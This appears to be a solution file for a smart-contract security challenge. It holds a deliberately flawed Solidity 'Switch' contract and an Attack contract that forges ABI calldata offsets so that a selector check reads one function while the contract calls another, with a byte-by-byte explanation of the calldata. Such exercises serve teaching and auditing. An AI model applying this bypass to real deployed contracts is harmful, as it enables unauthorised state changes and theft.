//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

     modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(
            selector[0] == offSelector,
            "Can only call the turnOffSwitch function"
        );
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success, ) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }

}

contract Attack {
    Switch public immutable sw;

    constructor() {
        sw = new Switch();
    }

    function kek() external {
        bytes memory data = abi.encodePacked(
            Switch.flipSwitch.selector,
            abi.encode(uint256(68)), // ignore 68 bytes
            abi.encode(uint256(0)), // an empty slot as a placeholder
            Switch.turnSwitchOff.selector, // the selector to pass `require`
            abi.encode(uint256(4)), // length to read
            Switch.turnSwitchOn.selector
        );

        (bool s,) = address(sw).call(data);
        if (!s) revert();
    }
}

/*

Selectors:
  turnSwitchOn -  0x76227e12
  turnSwitchOff - 0x20606e15
  flipSwitch -    0x30c13ade

If we want to turn off the switch, we call the Switch contract with this data: 0x30c13ade0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000420606e15
Which is:
  0x30c13ade - flipSwitch selector
  0000000000000000000000000000000000000000000000000000000000000020 - offset (where 0x00..0020 == 32 bytes), which tells how many bytes to skip from the previous selector (here we only skip this slot)
  0000000000000000000000000000000000000000000000000000000000000004 - length, which tells how many bytes to read next (here we only read 4 bytes)
  20606e15 - turnSwitchOff selector
N.B. Slot is every 32 bytes after the selector.

We can turn off the switch, but we cannot turn it on like this, because if we replace turnSwitchOff selector with turnSwitchOn selector,
it will not pass require(selector[0] == offSelector,"Can only call the turnOffSwitch function").
We get selector[0] using calldatacopy(selector, 68, 4), which says that we need to ignore 68 bytes and read the next 4 bytes.
68 bytes == 4 bytes from flipSwitch selector + 32 bytes of `offset` + 32 bytes of `length`

To turn on the switch we beed to change the calldata:
  0x30c13ade - flipSwitch selector
  0000000000000000000000000000000000000000000000000000000000000044 - offset, which tells to ignore 68 bytes == 0x00..044
  0000000000000000000000000000000000000000000000000000000000000000 - an empty slot as a placeholder
  20606e15 - turnSwitchOff selector to pass `require` statement
  0000000000000000000000000000000000000000000000000000000000000004 - length, which tells to read the next 4 bytes
  76227e12 - turnSwitchOn selector

Because we changed the offset the contract will call the turnSwitchOn function, but onlyOff modifier will still read turnSwitchOff selector
*/
